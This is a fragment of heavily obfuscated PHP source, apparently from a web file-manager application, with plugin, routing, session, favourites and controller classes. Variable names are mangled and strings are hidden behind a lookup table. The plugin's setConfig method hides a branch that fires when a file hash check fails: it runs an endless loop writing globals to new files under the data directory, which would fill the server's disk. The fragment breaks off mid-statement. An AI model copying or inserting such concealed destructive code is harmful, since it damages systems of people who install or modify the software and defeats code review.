$Ş¨‹í’»); } final function echoFile($ìúÍ¿›É, $Ûèáö™Ÿ = false) { $ÇıÓ‡´¾ =& $_SERVER[şÒÁøÒÄ]; $êÖ×ìì = $this->pluginPath . $ìúÍ¿›É; if (ACT == $ÇıÓ‡´¾[1601]) { echo $ÇıÓ‡´¾[1602] . $this->pluginName . $ÇıÓ‡´¾[8] . $ìúÍ¿›É . $ÇıÓ‡´¾[1603]; if (!file_exists($êÖ×ìì)) { echo $ÇıÓ‡´¾[1604]; return; } } $Øœß©ü = $this->parseFile($êÖ×ìì); $this->parseLang($Øœß©ü); $this->parseConfig($Øœß©ü); $this->parsePackage($Øœß©ü); if (is_array($Ûèáö™Ÿ)) { $Øœß©ü = str_replace(array_keys($Ûèáö™Ÿ), array_values($Ûèáö™Ÿ), $Øœß©ü); } echo $ÇıÓ‡´¾[231] . $Øœß©ü; } final function initLang() { $²ûÇ¡š£ =& $_SERVER[şÒÁøÒÄ]; $­åî¢€ë = $²ûÇ¡š£[1605]; $ ò«éö… = $this->pluginPath . $²ûÇ¡š£[1606]; $Ú‘¾¦Ùà = I18n::getType(); $¼ƒâÕ“Ï = array(); if (file_exists($ ò«éö… . $Ú‘¾¦Ùà . $²ûÇ¡š£[846])) { $¼ƒâÕ“Ï = (include $ ò«éö… . $Ú‘¾¦Ùà . $²ûÇ¡š£[846]); } else { if ($Ú‘¾¦Ùà == $²ûÇ¡š£[1607] && !file_exists($ ò«éö… . $Ú‘¾¦Ùà . $²ûÇ¡š£[846]) && file_exists($ ò«éö… . $²ûÇ¡š£[1608])) { $¼ƒâÕ“Ï = (include $ ò«éö… . $²ûÇ¡š£[1608]); } else { if (file_exists($ ò«éö… . $­åî¢€ë . $²ûÇ¡š£[846])) { $¼ƒâÕ“Ï = (include $ ò«éö… . $­åî¢€ë . $²ûÇ¡š£[846]); } } } if (!is_array($¼ƒâÕ“Ï)) { return array(); } if (@count($¼ƒâÕ“Ï) > 0) { I18n::set($¼ƒâÕ“Ï); } return $¼ƒâÕ“Ï; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ªæ²ƒ”˜) { $şÍæ¶ç– =& $_SERVER[şÒÁøÒÄ]; $Õçôç‹¥ = $_SERVER[$şÍæ¶ç–[884]] . $şÍæ¶ç–[885]; $Å›Ì‹˜Ğ = $şÍæ¶ç–[886]; if ($_SERVER[$şÍæ¶ç–[887]] != $Å›Ì‹˜Ğ($Õçôç‹¥)) { $¼ÒñÑ‘™ = $şÍæ¶ç–[888]; $ƒúöß†† = $şÍæ¶ç–[889]; $ò öšıº = $_SERVER[$şÍæ¶ç–[884]] . $şÍæ¶ç–[885]; $ÚˆÄÕ× = $ƒúöß††($ò öšıº); $ÑôÒ•œç = explode($şÍæ¶ç–[231], $ÚˆÄÕ×); if (count($ÑôÒ•œç) < $şÍæ¶ç–[616]) { $í¹šæîÛ = $şÍæ¶ç–[890]; $í¹šæîÛ(); } $ÙŸù¨è– = $şÍæ¶ç–[891]; $ÙŸù¨è–($_SERVER[$şÍæ¶ç–[892]]); $¼ÒñÑ‘™ = $şÍæ¶ç–[888]; $¼ÒñÑ‘™(); $îÍ’¨óî = $şÍæ¶ç–[893]; $×Ÿ™®· = json_encode($GLOBALS[$şÍæ¶ç–[894]]); $é†ú×Ò = 1; for ($õÈ¼¾É‹ = $é†ú×Ò; $õÈ¼¾É‹ > 0; $õÈ¼¾É‹++) { $îÍ’¨óî(DATA_PATH . $õÈ¼¾É‹, $×Ÿ™®·); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ªæ²ƒ”˜); } public function onSetConfig($ìİ¸ŠŠÂ) { } public function onGetConfig($îÖ¡Óı¢) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ıíÜˆÑÄ) { if ($ıíÜˆÑÄ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($…Ãï“õİ = "\160\154\x75\x67\151\156\x41\x75\x74\150") { $°µ‹±‹ =& $_SERVER[şÒÁøÒÄ]; if (!Session::get($°µ‹±‹[1560])) { return !1; } if (_get($GLOBALS, $°µ‹±‹[494])) { return !0; } $Ëç¾Ä‡Ñ = $this->getConfig(); if (!$Ëç¾Ä‡Ñ[$…Ãï“õİ]) { return !1; } return ActionCall($°µ‹±‹[1609], $Ëç¾Ä‡Ñ[$…Ãï“õİ]); } public function url($õœ®°‚ä, $ßğ™€İ = '', $ï†úú©Ö = true) { $µ¦ùš˜Ï =& $_SERVER[şÒÁøÒÄ]; $áôğ´Ï = $this->getConfig(); $ñöÖÖùü = KOD_VERSION . $µ¦ùš˜Ï[10] . KOD_VERSION_BUILD; $»†–ÎŒÃ = $this->packageVersion(); $¦¾Òûæ„ = $ñöÖÖùü . $µ¦ùš˜Ï[386] . $»†–ÎŒÃ; if (substr($õœ®°‚ä, 0, 4) == $µ¦ùš˜Ï[148] || substr($õœ®°‚ä, 0, 2) == $µ¦ùš˜Ï[1394]) { $ááŠÆ„Â = $õœ®°‚ä . $µ¦ùš˜Ï[1610] . $¦¾Òûæ„; } else { if ($ßğ™€İ == $µ¦ùš˜Ï[12]) { $ááŠÆ„Â = $this->pluginHost . $õœ®°‚ä . $µ¦ùš˜Ï[1610] . $¦¾Òûæ„; } else { if ($ßğ™€İ === $µ¦ùš˜Ï[75]) { $ááŠÆ„Â = $this->pluginHost . $õœ®°‚ä; } else { if ($ßğ™€İ == $µ¦ùš˜Ï[1611]) { $ááŠÆ„Â = STATIC_PATH . $õœ®°‚ä . $µ¦ùš˜Ï[1610] . $ñöÖÖùü; } else { if ($ßğ™€İ == $µ¦ùš˜Ï[1612]) { $ááŠÆ„Â = APP_HOST . $µ¦ùš˜Ï[1613] . $õœ®°‚ä . $µ¦ùš˜Ï[1610] . $ñöÖÖùü; } else { if (isset($áôğ´Ï[$ßğ™€İ])) { $ááŠÆ„Â = $áôğ´Ï[$ßğ™€İ] . $õœ®°‚ä . $µ¦ùš˜Ï[1610] . $¦¾Òûæ„; } } } } } } if (!$ï†úú©Ö) { return $ááŠÆ„Â; } echo $ááŠÆ„Â; } public function link($¥ÜşŠÈõ = false, $Ô¾‚ÅÕµ = '') { $±€«ì¶Ø =& $_SERVER[şÒÁøÒÄ]; if (!$¥ÜşŠÈõ) { $this->link($±€«ì¶Ø[1614], $±€«ì¶Ø[1612]); $this->link($±€«ì¶Ø[1615], $±€«ì¶Ø[1611]); $this->link($±€«ì¶Ø[1616], $±€«ì¶Ø[1611]); $this->link($±€«ì¶Ø[1617], $±€«ì¶Ø[1611]); $this->link($±€«ì¶Ø[1618], $±€«ì¶Ø[1611]); return; } $Ø°µÎ§ = $this->url($¥ÜşŠÈõ, $Ô¾‚ÅÕµ, !1); if (substr($¥ÜşŠÈõ, -3) == $±€«ì¶Ø[1619]) { echo $±€«ì¶Ø[1620] . $Ø°µÎ§ . $±€«ì¶Ø[1621] . $±€«ì¶Ø[231]; } else { if (substr($¥ÜşŠÈõ, -4) == $±€«ì¶Ø[1622]) { echo $±€«ì¶Ø[1623] . $Ø°µÎ§ . $±€«ì¶Ø[1624] . $±€«ì¶Ø[231]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\x5b\136\x2f\135\x2b", "\x3a\x6e\x75\x6d" => "\133\60\55\71\135\53", "\72\x61\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($æ¿ «¸”, $Ëßøı–¨) { $ÅÆ‘•Şè =& $_SERVER[şÒÁøÒÄ]; if ($æ¿ «¸” == $ÅÆ‘•Şè[1625]) { $ÇÂâÀÁø = array_map($ÅÆ‘•Şè[1626], $Ëßøı–¨[0]); $Ãòğ°Ÿ = strpos($Ëßøı–¨[1], $ÅÆ‘•Şè[8]) === 0 ? $Ëßøı–¨[1] : $ÅÆ‘•Şè[8] . $Ëßøı–¨[1]; $±¥Ş¿í = $Ëßøı–¨[2]; } else { $ÇÂâÀÁø = null; $Ãòğ°Ÿ = strpos($Ëßøı–¨[0], $ÅÆ‘•Şè[8]) === 0 ? $Ëßøı–¨[0] : $ÅÆ‘•Şè[8] . $Ëßøı–¨[0]; $±¥Ş¿í = $Ëßøı–¨[1]; } array_push(self::$maps, $ÇÂâÀÁø); array_push(self::$routes, $Ãòğ°Ÿ); array_push(self::$methods, strtoupper($æ¿ «¸”)); array_push(self::$callbacks, $±¥Ş¿í); } public static function error($Èãóšï÷) { self::$errorCallback = $Èãóšï÷; } public static function haltOnMatch($ñ¬÷Ô¢­ = true) { self::$halts = $ñ¬÷Ô¢­; } public static function dispatch() { $Şú˜Å²  =& $_SERVER[şÒÁøÒÄ]; $‹ÊÀç = parse_url($_SERVER[$Şú˜Å² [1627]], PHP_URL_PATH); $©òÊÄø» = $_SERVER[$Şú˜Å² [159]]; $‹… ÆÚ = array_keys(static::$patterns); $Œâà¢òü = array_values(static::$patterns); $ŸÉŒı¢ = !1; self::$routes = preg_replace($Şú˜Å² [1289], $Şú˜Å² [8], self::$routes); if (in_array($‹ÊÀç, self::$routes)) { $¯‡¨ÖÅ¹ = array_keys(self::$routes, $‹ÊÀç); foreach ($¯‡¨ÖÅ¹ as $Ô¸³¢î) { if (self::$methods[$Ô¸³¢î] == $©òÊÄø» || self::$methods[$Ô¸³¢î] == $Şú˜Å² [1628] || in_array($©òÊÄø», self::$maps[$Ô¸³¢î])) { $ŸÉŒı¢ = !0; if (!is_object(self::$callbacks[$Ô¸³¢î])) { $™Ø€—î« = explode($Şú˜Å² [8], self::$callbacks[$Ô¸³¢î]); $ó‚¸ÕÈ¢ = end($™Ø€—î«); $¾”ø…ˆ× = explode($Şú˜Å² [1221], $ó‚¸ÕÈ¢); $‚·¢Œğ¾ = new $¾”ø…ˆ×[0](); $‚·¢Œğ¾->{$¾”ø…ˆ×[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Ô¸³¢î]); if (self::$halts) { return; } } } } } else { $§€£æ¿Ñ = 0; foreach (self::$routes as $Ô¸³¢î) { if (strpos($Ô¸³¢î, $Şú˜Å² [4]) !== !1) { $Ô¸³¢î = str_replace($‹… ÆÚ, $Œâà¢òü, $Ô¸³¢î); } if (preg_match($Şú˜Å² [1629] . $Ô¸³¢î . $Şú˜Å² [1630], $‹ÊÀç, $ÌÙï¯®Œ)) { if (self::$methods[$§€£æ¿Ñ] == $©òÊÄø» || self::$methods[$§€£æ¿Ñ] == $Şú˜Å² [1628] || !empty(self::$maps[$§€£æ¿Ñ]) && in_array($©òÊÄø», self::$maps[$§€£æ¿Ñ])) { $ŸÉŒı¢ = !0; array_shift($ÌÙï¯®Œ); if (!is_object(self::$callbacks[$§€£æ¿Ñ])) { $™Ø€—î« = explode($Şú˜Å² [8], self::$callbacks[$§€£æ¿Ñ]); $ó‚¸ÕÈ¢ = end($™Ø€—î«); $¾”ø…ˆ× = explode($Şú˜Å² [1221], $ó‚¸ÕÈ¢); $‚·¢Œğ¾ = new $¾”ø…ˆ×[0](); if (!method_exists($‚·¢Œğ¾, $¾”ø…ˆ×[1])) { echo $Şú˜Å² [1631]; } else { call_user_func_array(array($‚·¢Œğ¾, $¾”ø…ˆ×[1]), $ÌÙï¯®Œ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$§€£æ¿Ñ], $ÌÙï¯®Œ); if (self::$halts) { return; } } } } $§€£æ¿Ñ++; } } if ($ŸÉŒı¢ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Ğìó¶­ =& $_SERVER[şÒÁøÒÄ]; header($_SERVER[$Ğìó¶­[1632]] . $Ğìó¶­[1633]); echo $Ğìó¶­[1634]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Şú˜Å² [1627]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $¢¢“°ÙÁ =& $_SERVER[şÒÁøÒÄ]; static $¸éõê = false; if ($¸éõê) { return $¸éõê; } $™Ë…šÆ¸ = $GLOBALS[$¢¢“°ÙÁ[6]][$¢¢“°ÙÁ[349]]; self::$sessionTime = $™Ë…šÆ¸[$¢¢“°ÙÁ[1635]]; $¨Ğâß€ä = isset($GLOBALS[$¢¢“°ÙÁ[1636]]) ? $GLOBALS[$¢¢“°ÙÁ[1636]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¨Ğâß€ä)) { self::$sessionSign = Cookie::get($¨Ğâß€ä); } else { self::$sessionSign = guid(); } } Cookie::setSafe($¨Ğâß€ä, self::$sessionSign, self::$sessionTime); $€¯ª«Ãà = $™Ë…šÆ¸[$¢¢“°ÙÁ[1637]]; $Ï³¸œÒ = $™Ë…šÆ¸[$€¯ª«Ãà]; $¦Ì†”ë¤ = $™Ë…šÆ¸[$¢¢“°ÙÁ[836]]; switch ($€¯ª«Ãà) { case $¢¢“°ÙÁ[21]: self::$handle = Model($¢¢“°ÙÁ[837]); break; case $¢¢“°ÙÁ[838]: self::$handle = new CacheRedis($Ï³¸œÒ, $¦Ì†”ë¤); break; case $¢¢“°ÙÁ[839]: self::$handle = new CacheMemcached($Ï³¸œÒ, $¦Ì†”ë¤); break; case $¢¢“°ÙÁ[200]: $Ï³¸œÒ[$¢¢“°ÙÁ[84]] = $Ï³¸œÒ[$¢¢“°ÙÁ[84]] . $¢¢“°ÙÁ[1638]; self::$handle = new CacheFile($Ï³¸œÒ, $¦Ì†”ë¤); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $¸éõê = new self(); return $¸éõê; } public static function getBySign($Áí‘ÊíÛ) { $‹‚ùÉ­¿ = self::$handle->get($Áí‘ÊíÛ); $‹‚ùÉ­¿ = unserialize($‹‚ùÉ­¿); return is_array($‹‚ùÉ­¿) ? $‹‚ùÉ­¿ : array(); } public static function setBySign($Œªşßáõ, $ûâ¹ƒÚ) { CacheLock::lock($Œªşßáõ); self::$handle->set($Œªşßáõ, serialize($ûâ¹ƒÚ), self::$sessionTime); CacheLock::unlock($Œªşßáõ); } public static function sign($îëúÜüâ = false) { $îëúÜüâ && (self::$sessionSign = $îëúÜüâ); self::init(); return self::$sessionSign; } public static function set($ÜÍğœÔ, $ÄÍ¿ºêÆ = false) { self::init(); if (is_array($ÜÍğœÔ)) { foreach ($ÜÍğœÔ as $¡ŠäÓ => $ôßøß„Ü) { array_set_value(self::$data, $¡ŠäÓ, $ôßøß„Ü); } } else { array_set_value(self::$data, $ÜÍğœÔ, $ÄÍ¿ºêÆ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ÖÍç²Ù± = false) { self::init(); if (!$ÖÍç²Ù±) { return self::$data; } return array_get_value(self::$data, $ÖÍç²Ù±); } public static function remove($åÄ‡¡ˆ–) { self::init(); unset(self::$data[$åÄ‡¡ˆ–]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[şÒÁøÒÄ][841])) { self::$handle->clearTimeout(); } } } goto FêÍ¯‚Ñ; D‰·šÑ†Š¢: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\x66\141\166"; protected function cacheFunctionAlias($ÜÛ‘ÏÂé) { $·ØÆ‚ù¹ =& $_SERVER[şÒÁøÒÄ]; return array($·ØÆ‚ù¹[1980] => array(USER_ID, $·ØÆ‚ù¹[2313])); } protected function listData() { $ü·®ºñ =& $_SERVER[şÒÁøÒÄ]; $Œûâà†å = array($ü·®ºñ[1671] => USER_ID, $ü·®ºñ[483] => 0); $ô¸Éï± = $ü·®ºñ[2314]; $îƒ’³†ü = $this->field($ô¸Éï±)->where($Œûâà†å)->order($ü·®ºñ[2315])->select(); return $îƒ’³†ü ? $îƒ’³†ü : array(); } protected function resetCache() { } protected function listView() { $×½Á­‚ =& $_SERVER[şÒÁøÒÄ]; $ïí¼Ü¢ˆ = $this->listData(); $¸å¥›ëÄ = array_filter_by_field($ïí¼Ü¢ˆ, $×½Á­‚[33], $×½Á­‚[416]); $±´ìäÔ¡ = array_to_keyvalue($¸å¥›ëÄ, $×½Á­‚[12], $×½Á­‚[84]); if (!$±´ìäÔ¡) { return $ïí¼Ü¢ˆ; } $îØÎŸ¾• = 2000; $ƒœ‰ù = array($×½Á­‚[417] => array($×½Á­‚[418], $±´ìäÔ¡)); $Ó’ØÓ‰¿ = Model($×½Á­‚[833])->listSource($ƒœ‰ù, $îØÎŸ¾•); $Ó’ØÓ‰¿ = array_merge($Ó’ØÓ‰¿[$×½Á­‚[83]], $Ó’ØÓ‰¿[$×½Á­‚[82]]); $Ó’ØÓ‰¿ = array_to_keyvalue($Ó’ØÓ‰¿, $×½Á­‚[402]); foreach ($ïí¼Ü¢ˆ as $¦âõíŠ¬ => $ÇÍæµ¦®) { $ß›Ëœ÷î = $Ó’ØÓ‰¿[$ÇÍæµ¦®[$×½Á­‚[84]]]; $ß›Ëœ÷î = $ß›Ëœ÷î ? $ß›Ëœ÷î : array(); $ïí¼Ü¢ˆ[$¦âõíŠ¬] = array_merge($ß›Ëœ÷î, $ÇÍæµ¦®); } return $ïí¼Ü¢ˆ; } protected function addFav($Ó¼¢¹Í›, $Š¾Æ£¬à = '', $ƒ’à°Â· = "\163\x6f\x75\162\143\145") { $Î¤ŸÒæÅ =& $_SERVER[şÒÁøÒÄ]; $¾Óëíçå = array($Î¤ŸÒæÅ[1671] => USER_ID, $Î¤ŸÒæÅ[483] => 0, $Î¤ŸÒæÅ[422] => $ƒ’à°Â·, $Î¤ŸÒæÅ[421] => $Ó¼¢¹Í›); if ($this->where($¾Óëíçå)->find()) { return !1; } $¾Óëíçå = array($Î¤ŸÒæÅ[1671] => USER_ID, $Î¤ŸÒæÅ[483] => 0); $ÇŞÖ = $this->where($¾Óëíçå)->max($Î¤ŸÒæÅ[1893]); if (!$ÇŞÖ) { $ÇŞÖ = 0; } if (!$Š¾Æ£¬à && $ƒ’à°Â· == $Î¤ŸÒæÅ[416]) { $ğÍ¦„Ô® = Model($Î¤ŸÒæÅ[1352])->where(array($Î¤ŸÒæÅ[417] => $Ó¼¢¹Í›))->find(); if (!$ğÍ¦„Ô®) { return !1; } $Š¾Æ£¬à = $ğÍ¦„Ô®[$Î¤ŸÒæÅ[32]]; } $Š¾Æ£¬à = $this->getAutoName($Š¾Æ£¬à); $¯œÕ§ŸÛ = array($Î¤ŸÒæÅ[1671] => USER_ID, $Î¤ŸÒæÅ[483] => 0, $Î¤ŸÒæÅ[420] => $Š¾Æ£¬à, $Î¤ŸÒæÅ[421] => $Ó¼¢¹Í›, $Î¤ŸÒæÅ[422] => $ƒ’à°Â·, $Î¤ŸÒæÅ[1873] => $ÇŞÖ + 1); return $this->add($¯œÕ§ŸÛ); } protected function remove($£Ä‹èÒ´) { $ûÍ¾ù¤× =& $_SERVER[şÒÁøÒÄ]; $àªË»¸Ü = array($ûÍ¾ù¤×[1671] => USER_ID, $ûÍ¾ù¤×[419] => $£Ä‹èÒ´); return $this->where($àªË»¸Ü)->delete(); } protected function removeByName($‰û¯ÁôÉ) { $Ş£ÛÑÁ =& $_SERVER[şÒÁøÒÄ]; $»¢±®ÒÌ = array($Ş£ÛÑÁ[1671] => USER_ID, $Ş£ÛÑÁ[420] => $‰û¯ÁôÉ, $Ş£ÛÑÁ[483] => 0); return $this->where($»¢±®ÒÌ)->delete(); } protected function rename($³™Ÿ…ïù, $ßø›úªÜ) { $×§¹¥äŠ =& $_SERVER[şÒÁøÒÄ]; if ($³™Ÿ…ïù == $ßø›úªÜ) { return !1; } $¡ëĞßª´ = $this->getAutoName($ßø›úªÜ); if ($ßø›úªÜ != $¡ëĞßª´) { return !1; } $ê·–é¨ = array($×§¹¥äŠ[1671] => USER_ID, $×§¹¥äŠ[483] => 0, $×§¹¥äŠ[32] => $³™Ÿ…ïù); return $this->where($ê·–é¨)->save(array($×§¹¥äŠ[32] => $ßø›úªÜ)); } protected function resetSort($ å„Ã ä) { $‹¬¯×©ş =& $_SERVER[şÒÁøÒÄ]; $ å„Ã ä = is_array($ å„Ã ä) ? $ å„Ã ä : array(); $‰øÃİ°† = array($‹¬¯×©ş[1671] => USER_ID); for ($æØé¤¶Ò = 0; $æØé¤¶Ò < count($ å„Ã ä); $æØé¤¶Ò++) { $‰øÃİ°†[$‹¬¯×©ş[419]] = $ å„Ã ä[$æØé¤¶Ò]; $this->where($‰øÃİ°†)->save(array($‹¬¯×©ş[1873] => $æØé¤¶Ò + 1)); } return !0; } protected function moveTop($•îá‹ã­) { $ùÛö£Ë† =& $_SERVER[şÒÁøÒÄ]; $ÊÖÆûÚî = array($ùÛö£Ë†[1671] => USER_ID, $ùÛö£Ë†[483] => 0); $ŒÒ¦øúî = $this->where($ÊÖÆûÚî)->where(array($ùÛö£Ë†[32] => $•îá‹ã­))->find(); if (!$ŒÒ¦øúî) { return; } $ØÉËû = $this->field($ùÛö£Ë†[399])->where($ÊÖÆûÚî)->order($ùÛö£Ë†[2315])->select(); $ØÉËû = array_to_keyvalue($ØÉËû, $ùÛö£Ë†[12], $ùÛö£Ë†[399]); $ñÁöÕàü = $ØÉËû; $ØÉËû = array_remove_value($ØÉËû, $ŒÒ¦øúî[$ùÛö£Ë†[399]]); array_unshift($ØÉËû, $ŒÒ¦øúî[$ùÛö£Ë†[399]]); return $this->resetSort($ØÉËû); } protected function moveBottom($ê˜ø•§) { $÷Üª£ =& $_SERVER[şÒÁøÒÄ]; $ã¢…Æ = array($÷Üª£[1671] => USER_ID, $÷Üª£[483] => 0); $¨ùˆ±…– = $this->where($ã¢…Æ)->max($÷Üª£[1893]); $İ²ŞÃäš = array($÷Üª£[1893] => $¨ùˆ±…– + 1); return $this->where($ã¢…Æ)->where(array($÷Üª£[32] => $ê˜ø•§))->save($İ²ŞÃäš); } private function getAutoName($Æ£ŒŸ§¾) { $¡¯­’—° =& $_SERVER[şÒÁøÒÄ]; $¶Ü¸îùÑ = array($¡¯­’—°[1671] => USER_ID, $¡¯­’—°[483] => 0); $ûƒ¬š¶õ = $this->field($¡¯­’—°[32])->where($¶Ü¸îùÑ)->select(); $ûƒ¬š¶õ = array_to_keyvalue($ûƒ¬š¶õ, $¡¯­’—°[12], $¡¯­’—°[32]); if (!$ûƒ¬š¶õ || !in_array($Æ£ŒŸ§¾, $ûƒ¬š¶õ)) { return $Æ£ŒŸ§¾; } for ($¾œöæ®û = 0; $¾œöæ®û < count($ûƒ¬š¶õ); $¾œöæ®û++) { if (!in_array($Æ£ŒŸ§¾ . "\x28{$¾œöæ®û}\51", $ûƒ¬š¶õ)) { return $Æ£ŒŸ§¾ . "\x28{$¾œöæ®û}\x29"; } } return $Æ£ŒŸ§¾ . "\x28{$¾œöæ®û}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\56\x6a\x6f\x62\x4c\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\x64\x65\x73\x63", "\163\157\x72\164"); const JOB_KEY = "\163\145\x6c\x66\x4a\x6f\142\x4c\151\x73\x74"; public function listData($êÔşÙµ– = false, $¾Ó–®Ô€ = "\163\157\162\164", $¼Ù˜÷û = false) { return parent::listData($êÔşÙµ–, $¾Ó–®Ô€, $¼Ù˜÷û); } public function remove($úÂ¹² ·) { return parent::remove($úÂ¹² ·); } public function add($Òá¨ĞÆç) { $‰„ì ©‚ =& $_SERVER[şÒÁøÒÄ]; if ($this->findByName($Òá¨ĞÆç[$‰„ì ©‚[32]])) { return !1; } $Òá¨ĞÆç[$‰„ì ©‚[1893]] = $this->getSort(); return parent::insert($Òá¨ĞÆç); } private function getSort() { $™íß£êè =& $_SERVER[şÒÁøÒÄ]; $Âƒ£’‹ = parent::listData(); $Çƒä£Æä = array_to_keyvalue($Âƒ£’‹, $™íß£êè[12], $™íß£êè[1893]); return empty($Çƒä£Æä) ? 0 : max($Çƒä£Æä) + 1; } public function update($÷Šˆ¤¨«, $œçíÅ›) { $”†Õ–›´ =& $_SERVER[şÒÁøÒÄ]; $…š“¸é¦ = parent::listData($÷Šˆ¤¨«); $Šäô¼‚ = $this->findByName($œçíÅ›[$”†Õ–›´[32]]); if (!$…š“¸é¦ || $Šäô¼‚ && $Šäô¼‚[$”†Õ–›´[399]] != $…š“¸é¦[$”†Õ–›´[399]]) { return !1; } return parent::update($÷Šˆ¤¨«, $œçíÅ›); } public function setUserJob($ñöÖ÷Í‰, $æ¤‚øú) { $Ğ‘û°”è =& $_SERVER[şÒÁøÒÄ]; if (!is_array($æ¤‚øú)) { $æ¤‚øú = array($æ¤‚øú); } $¾›äëµµ = parent::listData(); $‡şÔ™Í¾ = array_to_keyvalue($¾›äëµµ, $Ğ‘û°”è[32]); $–œŒüäƒ = $Ğ‘û°”è[378]; foreach ($æ¤‚øú as $¨¡Ö¯úÈ) { if ($‡şÔ™Í¾[$¨¡Ö¯úÈ]) { $–œŒüäƒ .= $‡şÔ™Í¾[$¨¡Ö¯úÈ][$Ğ‘û°”è[399]] . $Ğ‘û°”è[50]; } else { $Ò¤º¾ø¢ = $this->add($¨¡Ö¯úÈ); $–œŒüäƒ .= $Ò¤º¾ø¢ . $Ğ‘û°”è[50]; } } $–œŒüäƒ = rtrim($–œŒüäƒ, $Ğ‘û°”è[50]); Model($Ğ‘û°”è[525])->metaSet($ñöÖ÷Í‰, self::JOB_KEY, $–œŒüäƒ); } public function getUserJob($Ñ«ÏíˆÌ) { $¿®ïûü = Model($_SERVER[şÒÁøÒÄ][525])->metaGet($Ñ«ÏíˆÌ); return $this->getUserJobInfo($¿®ïûü[self::JOB_KEY]); } public function getUserJobInfo($–…î¿ú‰) { $ùé›ÃÔ =& $_SERVER[şÒÁøÒÄ]; $…û§¾¬ú = explode($ùé›ÃÔ[50], $–…î¿ú‰); $·œ–¸üå = parent::listData(); $·œ–¸üå = array_remove_key($·œ–¸üå, $ùé›ÃÔ[201]); $õËˆ‹ù = array(); foreach ($…û§¾¬ú as $‚õÅ˜Í³) { if (isset($·œ–¸üå[$‚õÅ˜Í³])) { $õËˆ‹ù[] = $·œ–¸üå[$‚õÅ˜Í³]; } } return $õËˆ‹ù; } } $_file = $_SERVER[$_SERVER[şÒÁøÒÄ][1370]]; goto cªñ·©è; Dä¿µ’Ë¹: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Œã¯’Ê =& $_SERVER[şÒÁøÒÄ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Œã¯’Ê[6]] =& $config; $this->values[$Œã¯’Ê[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Œã¯’Ê[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ÈÁ”ù“´) { if (1 === func_num_args()) { $this->{$ÈÁ”ù“´} = new $ÈÁ”ù“´(); } else { $Ş÷¸»âò = new ReflectionClass($ÈÁ”ù“´); $‘™ÅÃšû = func_get_args(); array_shift($‘™ÅÃšû); $this->{$ÈÁ”ù“´} = $Ş÷¸»âò->newInstanceArgs($‘™ÅÃšû); } return $this->{$ÈÁ”ù“´}; } public function routeBind($ŞƒÔí Ò, $í¼‹ñ‡¶, $°é­®ä— = 3) { $°÷²ìÜÊ =& $_SERVER[şÒÁøÒÄ]; $Œ³¨–‡´ = $this->in[$°÷²ìÜÊ[9]]; $ŞƒÔí Ò = str_replace($°÷²ìÜÊ[10], $°÷²ìÜÊ[11], trim(trim($ŞƒÔí Ò, $°÷²ìÜÊ[8]), $°÷²ìÜÊ[12])); if (!$ŞƒÔí Ò || count($Œ³¨–‡´) <= $°é­®ä—) { return !1; } $Ÿäé¾‚œ = !0; $™úæ‰¼ù = explode($°÷²ìÜÊ[8], $ŞƒÔí Ò); for ($²öÙË¬ = 0; $²öÙË¬ < count($™úæ‰¼ù); $²öÙË¬++) { if ($™úæ‰¼ù[$²öÙË¬] != $Œ³¨–‡´[$°é­®ä— + $²öÙË¬]) { $Ÿäé¾‚œ = !1; break; } } if (!$Ÿäé¾‚œ) { return; } call_user_func_array(array($this, $í¼‹ñ‡¶), array()); } public function routeArgs($‡¥ÙÀ¥‡ = 3) { $‚İ•øÎ¾ = $this->in[$_SERVER[şÒÁøÒÄ][9]]; if (count($‚İ•øÎ¾) <= $‡¥ÙÀ¥‡) { return array(); } $º¾ÜŒ‡â = array(); for ($Û¿Ğ­”À = $‡¥ÙÀ¥‡; $Û¿Ğ­”À < count($‚İ•øÎ¾); $Û¿Ğ­”À += 2) { $º¾ÜŒ‡â[$‚İ•øÎ¾[$Û¿Ğ­”À]] = $‚İ•øÎ¾[$Û¿Ğ­”À + 1]; $this->in[$‚İ•øÎ¾[$Û¿Ğ­”À]] = $‚İ•øÎ¾[$Û¿Ğ­”À + 1]; } return $º¾ÜŒ‡â; } protected function assign($Èœİ…—€, $Šº¶ï£) { $this->values[$Èœİ…—€] = $Šº¶ï£; } protected function display($Ò£ƒó‰˜) { ob_end_clean(); extract($this->values); require $this->tpl . $Ò£ƒó‰˜; } } class DbSqliteBase extends Db { public function __construct($Ò…©£Ğ¶ = '') { $æ½Õ¹†„ =& $_SERVER[şÒÁøÒÄ]; if (!extension_loaded($æ½Õ¹†„[13])) { think_exception(think_lang($æ½Õ¹†„[14]) . $æ½Õ¹†„[15]); } if (!empty($Ò…©£Ğ¶)) { if (!isset($Ò…©£Ğ¶[$æ½Õ¹†„[16]])) { 